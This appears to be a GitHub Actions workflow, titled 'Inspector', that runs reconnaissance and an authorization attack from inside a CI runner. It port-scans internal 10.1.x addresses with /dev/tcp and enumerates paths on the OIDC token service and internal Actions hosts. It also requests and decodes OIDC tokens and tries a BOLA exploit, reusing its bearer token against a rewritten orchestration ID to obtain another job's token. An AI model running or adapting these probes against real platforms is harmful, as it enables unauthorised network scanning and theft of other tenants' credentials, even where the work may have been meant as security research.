name: Inspector
on:
  workflow_dispatch:
permissions:
  contents: read
  id-token: write
jobs:
  inspect:
    runs-on: ubuntu-latest
    timeout-minutes: 8
    steps:
      - name: Internal network - find GitHub services
        run: |
          echo "=== OWN IP ==="
          ip addr show | grep "inet " | head -3
          echo ""
          echo "=== ROUTING TABLE ==="
          ip route show
          echo ""
          echo "=== FAST SUBNET SCAN (common service ports) ==="
          # Scan gateway and first few IPs for common ports
          for ip in 10.1.0.1 10.1.0.2 10.1.0.3 10.1.0.4 10.1.0.5 10.1.15.254; do
            for port in 80 443 8080 8443 22 3000 5000 8000 9000; do
              result=$(timeout 1 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null && echo "OPEN" || echo "")
              [ -n "$result" ] && echo "  $ip:$port OPEN"
            done
          done
          echo "(scan done)"

      - name: Probe OIDC token request endpoint for BOLA
        run: |
          echo "=== OWN OIDC URL ==="
          echo "$ACTIONS_ID_TOKEN_REQUEST_URL"
          echo ""
          echo "=== OIDC ENDPOINT STRUCTURE ==="
          # Extract base URL and try to enumerate other paths
          BASE=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | cut -d/ -f1-5)
          echo "Base: $BASE"
          # Try accessing other paths at the OIDC service
          for path in "/" "/health" "/.well-known/openid-configuration" "/22/" "/1/" "/0/"; do
            HTTP=$(curl -sf --max-time 5 -o /dev/null -w "%{http_code}" "$BASE$path" 2>/dev/null)
            echo "  $BASE$path -> HTTP $HTTP"
          done

      - name: OIDC with Azure audience (federated creds test)
        run: |
          echo "=== OIDC with Azure Exchange audience ==="
          T=$(curl -sf \
            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // "FAILED"')
          echo "Azure audience token: ${T:0:30}..."
          if [ "$T" != "FAILED" ]; then
            echo "Claims:"
            echo "$T" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
          fi

          echo ""
          echo "=== Try OIDC token for another job's OIDC URL (BOLA test) ==="
          # Try to reuse our token to get an OIDC token for a different orchestration ID
          MODIFIED_URL=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | sed 's/[0-9a-f-]\{36\}/00000000-0000-0000-0000-000000000000/g')
          echo "Modified URL: $MODIFIED_URL"
          HTTP=$(curl -sf --max-time 5 \
            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${MODIFIED_URL}&audience=sigstore" \
            -o /tmp/oidc_bola.json -w "%{http_code}")
          echo "BOLA attempt HTTP: $HTTP"
          cat /tmp/oidc_bola.json | head -3

      - name: Probe internal GitHub Actions service endpoints
        run: |
          echo "=== Actions service internal structure ==="
          # The OIDC URL reveals the internal service: run-actions-3-azure-eastus.actions.githubusercontent.com
          SVCHOST=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | cut -d/ -f3)
          echo "Service host: $SVCHOST"
          # Try other internal paths
          for path in "/" "/health" "/status" "/_status" "/metrics" "/22/"; do
            RESP=$(curl -sf --max-time 5 "https://$SVCHOST$path" -o /dev/null -w "%{http_code}" 2>/dev/null || echo "ERR")
            echo "  https://$SVCHOST$path -> $RESP"
          done
          echo ""
          echo "=== Try accessing runner registration endpoint ==="
          # runners.githubusercontent.com - internal runner management
          for host in "runner-images.actions.githubusercontent.com" "pipelines.actions.githubusercontent.com" "results.actions.githubusercontent.com"; do
            HTTP=$(curl -sf --max-time 5 "https://$host/" -o /dev/null -w "%{http_code}" 2>/dev/null || echo "ERR")
            echo "  $host -> $HTTP"
          done
